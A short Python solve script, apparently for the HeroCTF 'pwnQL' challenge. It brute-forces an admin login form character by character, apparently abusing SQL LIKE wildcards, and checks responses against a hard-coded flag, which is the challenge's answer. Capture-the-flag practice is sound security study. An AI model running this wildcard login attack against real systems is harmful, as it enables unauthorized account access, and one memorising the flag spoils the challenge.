from mechanize import Browser

def run(password):
    br = Browser()
    response = br.open('http://chall1.heroctf.fr:8080/index.php')
    br.select_form(nr=0)
    br.form['username'] = 'admin'
    br.form['password'] = password
    br.method = 'POST'
    response = br.submit()

    flag = b'Hero{pwnQL_b4sic_0ne_129835}'
    index = response.get_data().find(flag)
    try:
        if index > 0:
            if response.get_data()[index:index+len(flag)] == flag:
                print(f"Password: \"{password}\" worked!!")
                br.close()
                response.close()
                return True
        br.close()
        response.close()
        return False
    except:
        br.close()
        response.close()
        return False


def crack(pass_len):
    pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$"
    password = "_"*pass_len

    for i in range(pass_len):
        count = 0
        for ch in pool:
            password = password[:i] + ch + password[i+1:]
            if run(password):
                i += 1
                break
            count += 1
        if count == len(pool):
            raise AssertionError
    print(password)

crack(10)

# could've done all this with requests only but didn't hit me at that time :(
